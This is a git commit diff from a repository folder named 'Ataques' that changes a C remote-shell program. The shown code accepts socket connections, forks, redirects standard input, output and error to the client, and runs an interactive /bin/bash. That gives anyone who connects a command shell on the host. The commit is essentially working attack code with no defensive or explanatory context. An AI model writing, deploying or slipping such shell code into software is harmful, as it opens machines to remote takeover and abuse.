9c45966b63560ac5734509e06dbae16081a6aa22
NiPeGun <nipegun@gmail.com>
2025-02-09 02:23:24 +0100

    Update and rename BashReversoANetCat.c to BashReversoANetCat2.c

--- Ataques/BashReversoANetCat2.c
+++ Ataques/BashReversoANetCat2.c
@@ -41,7 +41,7 @@ int main() {
 
     int sockfd, clientfd;
     struct sockaddr_in server_addr;
-    char *shell[] = {"/bin/sh", "-i", NULL};
+    char *bash_shell[] = {"/bin/bash", "-i", NULL};  // Ejecutar bash en modo interactivo
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) exit(1);
@@ -57,12 +57,12 @@ int main() {
         clientfd = accept(sockfd, NULL, NULL);
         if (clientfd < 0) continue;
 
-        if (fork() == 0) {  // Proceso hijo: ejecuta el shell
+        if (fork() == 0) {  // Proceso hijo: ejecuta bash
             dup2(clientfd, STDIN_FILENO);
             dup2(clientfd, STDOUT_FILENO);
             dup2(clientfd, STDERR_FILENO);
             close(sockfd);
-            execve("/bin/sh", shell, NULL);
+            execve("/bin/bash", bash_shell, NULL);
             exit(0);
         }
 
